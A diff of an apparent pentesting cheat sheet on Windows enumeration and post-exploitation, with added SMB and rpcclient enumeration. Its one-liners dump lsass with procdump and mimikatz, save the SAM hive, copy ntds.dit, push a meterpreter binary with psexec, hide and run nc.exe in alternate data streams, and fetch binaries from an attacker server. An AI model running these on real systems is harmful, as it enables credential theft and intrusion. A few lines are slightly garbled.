@@ -3,11 +3,11 @@
 {% hint style="success" %}
 Hack Responsibly.
 
-Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
+Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here. &#x20;
 {% endhint %}
 
 {% hint style="info" %}
-Be aware sometimes these commands require elevated privileges to be run, or may be blocked by GPO or other means \([JEA](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview) for example\).
+Be aware sometimes these commands require elevated privileges to be run, or may be blocked by GPO or other means ([JEA](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/jea/overview) for example).
 
 Most commands that run in cmd.exe will also run in PowerShell! This gives many more options and provides flexibility at times. Some commands may not work directly though, and will need to be run through cmd.exe by prefixing the commands with **`cmd /c`**
 {% endhint %}
@@ -26,7 +26,7 @@ Most commands that run in cmd.exe will also run in PowerShell! This gives many m
 
 #### Groups
 
-`[Security.Principal.WindowsIdentity]::GetCurrent()` Not very good output by default, need to manipulate the object a bit to get the desired information
+`[Security.Principal.WindowsIdentity]::GetCurrent() `Not very good output by default, need to manipulate the object a bit to get the desired information
 
 The below example is better.  Will display group name and SIDs.  Still not the same as `whoami /all` though.
 
@@ -54,7 +54,7 @@ Get-WmiObject -ComputerName $env:computername -Class Win32_UserAccount -Filter "
 
 #### Using ADSI
 
-Can be run on remote machines by substituting `$env:computername` with the computer name of the remote machine. This returns a large amount of useful information. 
+Can be run on remote machines by substituting `$env:computername` with the computer name of the remote machine. This returns a large amount of useful information.&#x20;
 
 {% hint style="info" %}
 There is a property called Password, though this did not return anything on my Windows Account-enabled machine. Will have to try this on a domain or local account
@@ -68,7 +68,7 @@ $Users | Select *
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-`whoami /all` Includes: Username, SID, Groups \(including their descriptions!\), and user privileges. 
+`whoami /all` Includes: Username, SID, Groups (including their descriptions!), and user privileges.&#x20;
 
 `echo %username%` Displays the current username
 
@@ -80,7 +80,7 @@ $Users | Select *
 
 {% tabs %}
 {% tab title="PowerShell" %}
-`Get-WmiObject -class Win32_UserAccount` 
+`Get-WmiObject -class Win32_UserAccount`&#x20;
 
 \#if run on a domain connected machine dumps all accounts on the whole domain!
 {% endtab %}
@@ -88,7 +88,7 @@ $Users | Select *
 {% tab title="cmd.exe" %}
 ### Local machine Users & Groups Enumeration
 
-```text
+```
 net user %username% #Me 
 net users #All local users 
 net localgroup #Groups 
@@ -97,14 +97,14 @@ net localgroup Administrators #Who is inside Administrators group
 
 ### Active Directory Users & Groups Enumeration
 
-```text
+```
 net user /domain
 net group /domain
 ```
 {% endtab %}
 {% endtabs %}
 
-### Using WMI Query Language \(WQL\)
+### Using WMI Query Language (WQL)
 
 WQL is an entire subject on its own.  If you want to know the full extent of the capabilities of this powerful query language, type `Get-Help WQL` in a PowerShell prompt.  Below are a few examples of queries to pull lists of users from both local machines and from the domain.
 
@@ -119,14 +119,14 @@ Get-CimInstance -Query $q
 ```
 
 {% hint style="info" %}
-WQL uses the backslash \(`\`\) as its escape character. This is different from Windows PowerShell, which uses the backtick character \(`````\).
+WQL uses the backslash (`\`) as its escape character. This is different from Windows PowerShell, which uses the backtick character (`` ` ``).
 {% endhint %}
 
 ### LAPS
 
-LAPS allows you to manage the local Administrator password \(which is randomized, unique, and changed regularly\) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES. 
+LAPS allows you to manage the local Administrator password (which is randomized, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorized users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES.&#x20;
 
-```text
+```
 reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled
 ```
 
@@ -144,13 +144,13 @@ Search-ADAccount -PasswordNeverExpires
 
 ### Find AutoLogon passwords
 
-```text
+```
 reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>null | findstr "DefaultUserName DefaultDomainName DefaultPassword"
 ```
 
 ### Search for "password" in registry
 
-```text
+```
 reg query HKLM /f password /t REG_SZ /s
 reg query HKCU /f password /t REG_SZ /s
 ```
@@ -161,13 +161,13 @@ reg query HKCU /f password /t REG_SZ /s
 
 {% tabs %}
 {% tab title="PowerShell" %}
-```text
+```
 [System.Environment]::OSVersion
 ```
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-```text
+```
 systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 ```
 {% endtab %}
@@ -183,7 +183,7 @@ systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
 {% tab title="cmd.exe" %}
 `systeminfo`
 
-Gives basic hardware information, Also lists the hotfixes that have been installed.  
+Gives basic hardware information, Also lists the hotfixes that have been installed. &#x20;
 {% endtab %}
 {% endtabs %}
 
@@ -191,7 +191,7 @@ Gives basic hardware information, Also lists the hotfixes that have been install
 
 {% tabs %}
 {% tab title="PowerShell" %}
-```text
+```
 Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach $_.hotfixid {Get-Hotfix}
 ```
 
@@ -237,13 +237,13 @@ _Also aliased to_: `dir env:` or `ls env:` or `gci env:`
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-Show all current environment variables: `set` 
+Show all current environment variables: `set`&#x20;
 {% endtab %}
 {% endtabs %}
 
-### Check Audit \(logging\) Settings
+### Check Audit (logging) Settings
 
-These settings show what is being logged, this can be useful information for evasion and persistence 
+These settings show what is being logged, this can be useful information for evasion and persistence&#x20;
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -279,7 +279,7 @@ Add the `-Name $KeyName` property to get the value of a specific key.
 
 ### AV
 
-Check if there is any antivirus installed: 
+Check if there is any antivirus installed:&#x20;
 
 {% tabs %}
 {% tab title="PowerShell" %}
@@ -328,7 +328,7 @@ Check the status of the Windows Firewall
 Get-NetFirewallProfile -All
 ```
 
-Use the  `-Name Public` property \(instead of `-All`\) to select a specific firewall profile.  Pipe the results to `| Get-NetFirewallRule` to see the currently configured rules.
+Use the  `-Name Public` property (instead of `-All`) to select a specific firewall profile.  Pipe the results to `| Get-NetFirewallRule` to see the currently configured rules.
 {% endtab %}
 
 {% tab title="cmd.exe" %}
@@ -362,15 +362,15 @@ Get the contents of the clipboard `Get-Clipboard`
 
 {% tabs %}
 {% tab title="PowerShell" %}
-`Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)'` 
+`Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)'`&#x20;
 
 `Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE`
 
-The below PowerShell script will return a more complete list of all software installed by querying `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall` on a list of computer names.  It displays the following information: 
+The below PowerShell script will return a more complete list of all software installed by querying `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall` on a list of computer names.  It displays the following information:&#x20;
 
-* Computer Name, 
-* Software Name, 
-* Version, 
+* Computer Name,&#x20;
+* Software Name,&#x20;
+* Version,&#x20;
 * Publisher
 
 ```bash
@@ -416,15 +416,15 @@ $array | Where-Object { $_.DisplayName } | select ComputerName, DisplayName, Dis
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-`dir /a "C:\Program Files"` 
+`dir /a "C:\Program Files"`&#x20;
 
-`dir /a "C:\Program Files (x86)"` 
+`dir /a "C:\Program Files (x86)"`&#x20;
 
 `reg query HKEY_LOCAL_MACHINE\SOFTWARE`
 
 #### WMIC
 
-```text
+```
 wmic product get name /value
 ```
 {% endtab %}
@@ -432,9 +432,9 @@ wmic product get name /value
 
 
 
-### Uninstall Software <a id="cfde"></a>
+### Uninstall Software <a href="cfde" id="cfde"></a>
 
-```text
+```
 wmic product where name="$name" call uninstall /INTERACTIVE:OFF
 ```
 
@@ -442,17 +442,17 @@ wmic product where name="$name" call uninstall /INTERACTIVE:OFF
 
 {% tabs %}
 {% tab title="PowerShell" %}
-Get a list of services: 
+Get a list of services:&#x20;
 
 `Get-Service`
 {% endtab %}
 
 {% tab title="cmd.exe" %}
-Get a list of services: 
+Get a list of services:&#x20;
 
-`net start` 
+`net start`&#x20;
 
-`wmic service list brief` 
+`wmic service list brief`&#x20;
 
 `sc query`
 {% endtab %}
@@ -460,7 +460,7 @@ Get a list of services:
 
 #### Get detailed information for a specific service
 
-`sc qc $service_name` 
+`sc qc $service_name`&#x20;
 
 {% hint style="success" %}
 To use this command in PowerShell you need to specify `sc.exe` instead of `sc`. In PowerShell `sc` is an alias for `Set-Content` and will not give the expected output.
@@ -468,11 +468,11 @@ To use this command in PowerShell you need to specify `sc.exe` instead of `sc`. 
 
 #### Enable a disabled service
 
-If you are having this error \(for example with SSDPSRV\):
+If you are having this error (for example with SSDPSRV):
 
 > System error 1058 has occurred. The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. You can enable it using:
 >
-> ```text
+> ```
 > sc config SSDPSRV start= demand
 > sc config SSDPSRV obj= ".\LocalSystem" password= ""
 > ```
@@ -481,11 +481,11 @@ If you are having this error \(for example with SSDPSRV\):
 
 #### Enable a disabled service
 
-If you are having this error \(for example with SSDPSRV\):
+If you are having this error (for example with SSDPSRV):
 
 > System error 1058 has occurred. The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. You can enable it using:
 >
-> ```text
+> ```
 > sc config SSDPSRV start= demand
 > sc config SSDPSRV obj= ".\LocalSystem" password= ""
 > ```
@@ -506,20 +506,20 @@ Without usernames `Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft
 {% tab title="cmd.exe" %}
 `tasklist` list running processes
 
-| **`tasklist`** Options | Use |
-| :--- | :--- |
-| `/svc` | List all the service information for each process |
-| `/fo $format` | Change output format \[table is default\] |
-| `/s $ComputerName` | Run on remote computer \[Computer Name or IP\]\ |
-| `/u $username` | Username if credentials are needed |
-| `/p $password` | Password if credentials are needed |
-| `/v` | Verbose output |
+| **`tasklist`** Options | Use                                               |
+| ---------------------- | ------------------------------------------------- |
+| `/svc`                 | List all the service information for each process |
+| `/fo $format`          | Change output format \[table is default]          |
+| `/s $ComputerName`     | Run on remote computer \[Computer Name or IP]\\   |
+| `/u $username`         | Username if credentials are needed                |
+| `/p $password`         | Password if credentials are needed                |
+| `/v`                   | Verbose output                                    |
 {% endtab %}
 {% endtabs %}
 
 #### Check permissions of the process binaries
 
-```text
+```
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
     for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
         icacls "%%z" 
@@ -528,9 +528,9 @@ for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executabl
 )
 ```
 
-#### Check permissions of the folders of the process binaries \(useful for dll injection\)
+#### Check permissions of the folders of the process binaries (useful for dll injection)
 
-```text
+```
 for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v 
 "system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
     icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users 
@@ -547,18 +547,18 @@ todos %username%" && echo.
 `Get-NetTCPConnection`
 
 {% hint style="warning" %}
-`This cmdlet is for TCP connections ONLY! UDP information must be queried separately. See` **`Get-NetUDPEndpoint`** `below.`
+`This cmdlet is for TCP connections ONLY! UDP information must be queried separately. See `**`Get-NetUDPEndpoint` **`below.`
 {% endhint %}
 
 Get listening connections:
 
-```text
+```
 Get-NetTCPConnection | ? {$_.State -eq "Listen"}
 ```
 
 Check for anything that’s listening from any remote address:
 
-```text
+```
 Get-NetTCPConnection | ? {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")}
 ```
 
@@ -566,7 +566,7 @@ To get connection information for a specific port use the `-LocalPort $port` att
 
 Since this cmdlet returns objects, you can use these objects to return other information, such as getting the process ID associated with each connection:
 
-```text
+```
 $processes = (Get-NetTCPConnection | ? {($_.State -eq "Listen") -and ($_.RemoteAddress -eq "0.0.0.0")}).OwningProcess
 
 foreach ($process in $processes) {Get-Process -PID $process | select ID,ProcessName}
@@ -574,13 +574,13 @@ foreach ($process in $processes) {Get-Process -PID $process | select ID,ProcessN
 
 ### View UDP port connections with PowerShell
 
-```text
+```
 Get-NetUDPEndpoint | Select-Object -Property LocalAddress,LocalPort,OwningProcess |ft 
 ```
 
 To show listening ports filter for the address 0.0.0.0:
 
-```text
+```
 Get-NetUDPEndpoint | Where {$_.LocalAddress -eq "0.0.0.0"}
 ```
 
@@ -598,7 +598,7 @@ Shows TCP and UDP connections, with the following properties: Local Address, Loc
 
 TODO: Make this fully PowerShell implemented, without netstat
 
-```text
+```
 function Get-NetworkStatistics 
     { 
         $properties = ‘Protocol’,’LocalAddress’,’LocalPort’ 
@@ -649,9 +649,9 @@ function Get-NetworkStatistics
     Get-NetworkStatistics | Format-Table
 ```
 
-UDP info for updating above script \(this example only shows connections for port 1900\)
+UDP info for updating above script (this example only shows connections for port 1900)
 
-```text
+```
 $LOCALPORT = "1900"
 $CONNECTIONS = Get-NetUDPEndpoint |Select-Object -Property LocalPort, @{name='ProcessID';expression={(Get-Process -Id $_.OwningProcess). ID}}, @{name='ProcessName';expression={(Get-Process -Id $_.OwningProcess). Path}}
 Foreach ($I in $CONNECTIONS)
@@ -663,17 +663,17 @@ $I
 }
 ```
 
-[https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md\#network](https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network) \(TODO:check for more network enumeration info here\)
+[https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network](https://github.com/carlospolop/hacktricks/blob/master/windows/basic-cmd-for-pentesters.md#network) (TODO:check for more network enumeration info here)
 
 ### AutoRuns
 
-Check which files are executed when the computer is started. Components that are executed when a user logins can be exploited to execute malicious code when the administrator logins. \(cmd.exe\)
+Check which files are executed when the computer is started. Components that are executed when a user logins can be exploited to execute malicious code when the administrator logins. (cmd.exe)
 
 {% tabs %}
 {% tab title="PowerShell" %}
 
 
-```text
+```
 Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run'
 Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce'
@@ -687,7 +687,7 @@ Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
 {% tab title="cmd.exe" %}
 
 
-```text
+```
 wmic startup get caption,command 2>nul & ^
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run 2>nul & ^
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce 2>nul & ^
@@ -704,7 +704,7 @@ schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
 
 #### SysInternals AutoRuns
 
-For a comprehensive list of auto-executed files you can use AutoRuns from SysInternals 
+For a comprehensive list of auto-executed files you can use AutoRuns from SysInternals&#x20;
 
 * [https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)
 
@@ -712,9 +712,87 @@ To run this from a command prompt without popup windows:
 
 `autorunsc.exe -m -nobanner -a * -ct /accepteula`
 
-### 
+## SMB
 
+Port 139 and 445- SMB/Samba. Server Message Block is a service that enables the user to share files with other machines. Works the same as a command line FTP client, may browse files without even having credentials
 
+### Share List:
+
+```bash
+smbclient --list $targetip
+smbclient -L $targetip
+smbmap
+```
+
+### Check SMB vulnerabilities:
+
+```bash
+nmap --script=smb-check-vulns.nse $targetip -p 445
+```
+
+### SMB nmap scripts to enumerate shares and OS discovery
+
+```
+nmap -p 139,445 $ip_range --script smb-enum-shares.nse smb-os-discovery.nse
+```
+
+### Connect using Username
+
+```bash
+smbclient -L $targetip -U $UserName -p 445
+```
+
+### Connect to Shares
+
+```bash
+smbclient \\\\$targetip\\$ShareName
+smbclient \\\\$targetip\\$ShareName -U $UserName
+```
+
+### Enumerate with smb-shares
+
+```bash
+enum4linux -a $ipbash
+```
+
+`-a` "do everything" option
+
+### Get machine name and then enumerate with smbclient
+
+```
+nmblookup -A 192.168.1.102
+smbclient -L <server_name> -I 192.168.1.105
+```
+
+### rpcclient
+
+#### Connect with a null-session
+
+```bash
+rpcclient -U $UserName $ip
+rpcclient -U "" $ip
+#(press enter if asks for a password)
+```
+
+#### Common Checks
+
+```
+rpcclient $> srvinfo
+rpcclient $> enumdomusers
+rpcclient $> enumalsgroups domain
+rpcclient $> lookupnames administrators
+rpcclient> querydominfo
+rpcclient> enumdomusers
+rpcclient> queryuser john
+```
+
+### scan for vulnerabilities with nmap
+
+nm
+
+```bash
+nmap --script "vuln" -p139,445
+```
 
 ## [madhuakula](https://github.com/madhuakula)/[**wincmdfu**](https://github.com/madhuakula/wincmdfu)
 
@@ -726,13 +804,13 @@ Windows one line commands that make life easier, shortcuts and command line fu.
 
 #### Get entries from IPv4 neighbor cache
 
-```text
+```
 C:\>netsh interface ipv4 show neighbors
 ```
 
 #### Get available wireless networks via cmd and netsh
 
-```text
+```
 C:\>netsh wlan show networks mode=b
 ```
 
@@ -740,7 +818,7 @@ C:\>netsh wlan show networks mode=b
 
 Save the following in `ip.bat` in `%PATH%`
 
-```text
+```
 C:\>ipconfig | find /I "pv"
 ```
 
@@ -748,25 +826,25 @@ Call `ip` from CLI
 
 #### List ALL services AND their binaries
 
-```text
+```
 for /F "tokens=2* delims= " %i in ('sc query ^| find /I "ce_name"') do @sc qc %i %j
 ```
 
 #### Export SAM from the Windows Registry to a file
 
-```text
+```
 C:\>reg save HKLM\SAM "%temp%\SAM.reg"
 ```
 
 #### Enable remote desktop using reg
 
-```text
+```
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 ```
 
 #### Enable the boot log to see list of drivers loaded during startup
 
-```text
+```
 bcdedit /set bootlog yes
 ```
 
@@ -774,79 +852,79 @@ Read via `%windir%\ntbtlog.txt`
 
 #### Powershell cmdlet to create System Restore Point
 
-```text
+```
 PS C:\>Checkpoint-Computer -description "Restore point!"
 ```
 
 #### Check the current account for seDebugPrivilege
 
-```text
+```
 C:\> whoami /priv | findstr "Debug"
 ```
 
 For all privs:
 
-```text
+```
 C:\> whoami /priv
 ```
 
 #### Enable/disable system users via command line
 
-```text
+```
 C:\>net user test /active:yes (no)
 ```
 
 Get full help on the net user command:
 
-```text
+```
 C:\>net help user
 ```
 
 #### View process that is consuming the most memory using powershell
 
-```text
+```
 PS C:\> (Get-Process | Sort-Object -Descending WS)[0]
 ```
 
 #### Create an Alternate Data Stream from a file on an NTFS partition
 
-```text
+```
 C:\>type data.txt > C:\windows\explorer.exe:newads.txt
 ```
 
 #### Export running processes in CSV format
 
-```text
+```
 C:\> tasklist /FO CSV > tasks.txt
 ```
 
 #### Lock Windows desktop using command line
 
-```text
+```
 C:\> rundll32 user32.dll,LockWorkStation
 ```
 
 #### Start explorer with a file or folder selected/highlighted
 
-```text
+```
 C:\> explorer /select,C:\MyData\sample.docx
 ```
 
 #### Dump VirtualBox image containing RAM and ELF headers
 
-```text
+```
 C:\>vboxmanage debugvm "WinXPLab1" dumpguestcore --filename winxplab1.elf
 ```
 
 #### Set Time Zone of the system clock
 
-```text
+```
 C:\> tzutil /s "Eastern Standard Time"
 ```
 
 List available Time zones:
 
-```text
+```
 C:\> tzutil /l
 ```
 
@@ -854,31 +932,31 @@ C:\> tzutil /l
 
 **VirtualBox**
 
-```text
+```
 C:\> vboxmanage guestcontrol "WinXP" md "C:\\test" --username "user" --password "pass"
 ```
 
 #### Force copy meterpreter binary to remote machines & run as system
 
-```text
+```
 C:\> psexec @$ips.txt -s -u adminuser -p pass -f -c \exploits\mp.exe
 ```
 
 #### Create n/w share called `Apps`, with read access & limit to 10 conns
 
-```text
+```
 C:\> net share Apps=C:\Apps /G:everyone,READ /US:10
 ```
 
 #### List all the drives under My Computer using fsutil
 
-```text
+```
 C:\> fsutil.exe fsinfo drives
 ```
 
 #### Troubleshoot n/w packet drops with router statistics using pathping
 
-```text
+```
 C:\> pathping -n www.google.com
 ```
 
@@ -886,7 +964,7 @@ C:\> pathping -n www.google.com
 
 **For system wide list, remove the process name**
 
-```text
+```
 C:\> listdlls -u explorer.exe
 ```
 
@@ -894,7 +972,7 @@ C:\> listdlls -u explorer.exe
 
 **Server2008**
 
-```text
+```
 PS C:\> Get-ADComputer -filter {OperatingSystem -like "*XP*"}
 ```
 
@@ -902,19 +980,19 @@ PS C:\> Get-ADComputer -filter {OperatingSystem -like "*XP*"}
 
 **Change the number for different tabs**
 
-```text
+```
 C:\> control sysdm.cpl,,3
 ```
 
 #### Using the `dir` command to find Alternate Data Streams
 
-```text
+```
 C:\> dir /R | find ":$D"
 ```
 
-Using streams `sysinternals` \(shows path\):
+Using streams `sysinternals` (shows path):
 
-```text
+```
 C:\> streams -s .
 ```
 
@@ -922,58 +1000,58 @@ C:\> streams -s .
 
 **Use `mimikatz` `minidump` to get passwords**
 
-```text
+```
 C:\> procdump -accepteula -ma lsass.exe mini.dmp
 ```
 
 #### Run `mimikatz` in `minidump` mode & use `mini.dmp` from `procdump`
 
-```text
+```
 mimikatz # sekurlsa::minidump mini.dmp
 mimikatz # sekurlsa::logonPasswords
 ```
 
 #### Get list of startup programs using wmic
 
-```text
+```
 C:\> wmic startup list full
 ```
 
 #### Add a binary to an Alternate Data Stream
 
-```text
+```
 C:\> type c:\tools\nc.exe > c:\nice.png:nc.exe
 ```
 
-Execute it \(XP/2K3\):
+Execute it (XP/2K3):
 
-```text
+```
 C:\> start c:\nice.png:nc.exe
 ```
 
 #### Execute a binary Alternate Data Stream Win 7/2008 using wmic
 
-```text
+```
 C:\> wmic process call create C:\nice.png:nc.exe
 ```
 
 #### Show config & state info for Network Access Protection enabled client
 
-[https://technet.microsoft.com/en-us/library/cc730902\(v=ws.10\).aspx](https://technet.microsoft.com/en-us/library/cc730902%28v=ws.10%29.aspx)
+[https://technet.microsoft.com/en-us/library/cc730902(v=ws.10).aspx](https://technet.microsoft.com/en-us/library/cc730902\(v=ws.10\).aspx)
 
-```text
+```
 C:\> netsh nap client show configuration
 ```
 
 #### Get computer system information, including domain name and memory, using wmic
 
-```text
+```
 C:\> wmic computersystem list /format:csv
 ```
 
 #### Use the Package Manager in Windows to install the Telnet client on Windows Vista & higher
 
-```text
+```
 C:\> pkgmgr /iu:"TelnetClient"
 ```
 
@@ -981,13 +1059,13 @@ C:\> pkgmgr /iu:"TelnetClient"
 
 **Sysinternals**
 
-```text
+```
 C:\> sdelete -p 10 a.txt
 ```
 
 To recursively delete folders:
 
-```text
+```
 C:\> sdelete -10 -r C:\data\
 ```
 
@@ -995,19 +1073,19 @@ C:\> sdelete -10 -r C:\data\
 
 **It covers more locations than Windows inbuilt tools**
 
-```text
+```
 C:\> autorunsc -m -c
 ```
 
 #### Download files via commandline using PS
 
-```text
+```
 PS C:\> ipmo BitsTransfer;Start-BitsTransfer -Source http://foo/nc.exe -Destination C:\Windows\Temp\
 ```
 
 #### Fetch the last 10 entries from the Windows Security event log, in text format
 
-```text
+```
 C:\> wevtutil qe Security /c:10 /f:Text
 ```
 
@@ -1015,7 +1093,7 @@ C:\> wevtutil qe Security /c:10 /f:Text
 
 #### Create a dll that runs calc on invoke
 
-```text
+```
 msfpayload windows/exec cmd=calc.exe R | msfencode -t dll -o rcalc.dll
 
 C:\> rundll32.exe rcalc.dll,1
@@ -1025,19 +1103,19 @@ C:\> rundll32.exe rcalc.dll,1
 
 **You will be prompted for password**
 
-```text
+```
 C:\> runas /noprofile /user:domain\username "mmc wf.msc"
 ```
 
 #### Get shutdown/reboot events from the last 1000 log entries using PS
 
-```text
+```
 Get-EventLog -log system -n 1000 | Where {$_.eventid -eq '1074'} | fl -pr *
 ```
 
 #### Create a new snapshot of the volume that has the AD database and log files
 
-```text
+```
 C:\> ntdsutil sn "ac i ntds" create quit quit
 ```
 
@@ -1045,31 +1123,31 @@ C:\> ntdsutil sn "ac i ntds" create quit quit
 
 **Copy ntds.dit from snapshot & System hive from reg for pwd hashes**
 
-```text
+```
 C:\> ntdsutil snapshot "list all" "mount 1" quit quit
 ```
 
 #### Run a process on a remote system using wmic
 
-```text
+```
 C:\> wmic /node:ip process call create "net user dum dum /add"
 ```
 
 #### List the machines, with usernames, that were connected via RDP
 
-```text
+```
 C:\> reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers" /s
 ```
 
 #### List all process that are running on your system by remote users connected via RDP
 
-```text
+```
 C:\> query process *
 ```
 
 #### Reset the Windows TCP\IP stack
 
-```text
+```
 netsh int ip reset c:\tcpresetlog.txt
 ```
 
@@ -1077,25 +1155,25 @@ netsh int ip reset c:\tcpresetlog.txt
 
 **Very useful during a pentest to look for domain admins**
 
-```text
+```
 C:\> net session | find "\\"
 ```
 
 #### Set a static IP on a remote box
 
-```text
+```
 C:\> wmic /node:remotebox nicconfig where Index=1 call EnableStatic ("192.168.1.4"), ("255.255.255.0")
 ```
 
 #### Bypass powershell execution policy restrictions
 
-```text
+```
 PS C:\> powershell -ExecutionPolicy Bypass -Noninteractive -File .\lastboot.ps1
 ```
 
 #### List running processes every second on a remote box
 
-```text
+```
 C:\> wmic /node:target process list brief /every:1
 ```
 
@@ -1103,32 +1181,32 @@ C:\> wmic /node:target process list brief /every:1
 
 #### Get a list of running processes and their command line arguments on a remote system
 
-```text
+```
 C:\> wmic /node:target process get commandline, name
 ```
 
 #### Remotely enable and start the Volume Shadow Copy Service
 
-```text
+```
 C:\> sc \\target config vss start= auto
 C:\> sc \\target start vss
 ```
 
 #### Ping multiple IPs from `ips.txt` & see live hosts
 
-```text
+```
 C:\>for /F %i in (ips.txt) do ping -n 1 %i | find "bytes="
 ```
 
 #### Set global proxy in Windows to point to IE proxy
 
-```text
+```
 C:\> netsh winhttp import proxy source=ie
 ```
 
 #### Enumerate list of drivers with complete path information
 
-```text
+```
 C:\> driverquery /FO list /v
 ```
 
@@ -1136,7 +1214,7 @@ C:\> driverquery /FO list /v
 
 **Very useful during pentests**
 
-```text
+```
 C:\> gpresult /z /h outputfile.html
 ```
 
@@ -1144,32 +1222,32 @@ C:\> gpresult /z /h outputfile.html
 
 **Very helpful if you have a corrupt repo**
 
-```text
+```
 C:\> winmgmt /resetrepository
 ```
 
 #### Create symbolic links in Windows Vista, 7 & higher
 
-```text
+```
 C:\> mklink <link> <target>
 C:\> mklink D:\newlink.txt E:\thisexists.txt
 ```
 
 #### Enable the tftp client in Vista & higher
 
-```text
+```
 C:\> ocsetup TFTP /quiet
 ```
 
 Pull files to a `compromised server`:
 
-```text
+```
 C:\> tftp -i attacksrv get bin.exe
 ```
 
 #### Obtain list of firewall rules on a local system
 
-```text
+```
 C:\> netsh advfi fi sh rule name=all
 ```
 
@@ -1177,20 +1255,20 @@ C:\> netsh advfi fi sh rule name=all
 
 #### Get name of current domain controller
 
-```text
+```
 C:\> set log
 C:\> nltest /dcname:DOMAIN
 ```
 
 Get list of all DCs:
 
-```text
+```
 C:\> nltest /dclist:DOMAIN
 ```
 
 #### Look at content cached in kernel mode on IIS 7 and higher
 
-```text
+```
 C:\> netsh http sh ca
 ```
 
@@ -1198,7 +1276,7 @@ C:\> netsh http sh ca
 
 #### Quick test to check `MS15_034`
 
-```text
+```
 C:\> curl -v -H "Range: bytes=234234-28768768" "http://host/a.png" -o a.png
 ```
 
@@ -1208,13 +1286,13 @@ C:\> curl -v -H "Range: bytes=234234-28768768" "http://host/a.png" -o a.png
 
 #### Get a list of all open Named pipes via Powershell
 
-```text
+```
 PS C:\> [http://System.IO.Directory ]::GetFiles("\\.\\pipe\\")
 ```
 
 #### Possible `VENOM` detection on VirtualBox
 
-```text
+```
 C:\> vboxmanage list -l vms > a.txt
 ```
 
@@ -1222,19 +1300,19 @@ C:\> vboxmanage list -l vms > a.txt
 
 #### List RDP sessions on local or remote in list format
 
-```text
+```
 PS C:\> qwinsta /server: | foreach {($_.trim() -replace "\s+",",")} | ConvertFrom-Csv
 ```
 
 #### Get a list of service packs & hotfixes using wmic for remote systems listed in file
 
-```text
+```
 C:\> wmic /node:@file /output:out.txt qfe list full
 ```
 
 #### Export wireless connection profiles
 
-```text
+```
 C:\> netsh wlan export profile
 ```
 
@@ -1242,13 +1320,13 @@ C:\> netsh wlan export profile
 
 #### Unzip using PowerShell
 
-```text
+```
 PS C:\> Add-Type -A System.IO.Compression.FileSystem;[IO.Compression.ZipFile]::ExtractToDirectory(src,dst)
 ```
 
 #### Open the Network & Sharing center
 
-```text
+```
 control.exe /name Microsoft.NetworkandSharingCenter
 ```
 
@@ -1256,13 +1334,13 @@ control.exe /name Microsoft.NetworkandSharingCenter
 
 #### Remotely stop/start ftp on several systems
 
-```text
+```
 C:\> wmic /node:@ips.txt /user:u /password:p process call create "net <start> msftpsvc"
 ```
 
 #### To quickly find large files using cmd
 
-```text
+```
 C:\> forfiles /s /c "cmd /c if @fsize gtr 100000 echo @path @fsize bytes"
 ```
 
@@ -1270,13 +1348,13 @@ C:\> forfiles /s /c "cmd /c if @fsize gtr 100000 echo @path @fsize bytes"
 
 #### Print RDP connections
 
-```text
+```
 for /f "delims=" %i in ('reg query "HKCU\Software\Microsoft\Terminal Server Client\Servers"') do reg query "%i"
 ```
 
 #### List scheduled tasks & binaries
 
-```text
+```
 C:\> schtasks /query /fo LIST /v
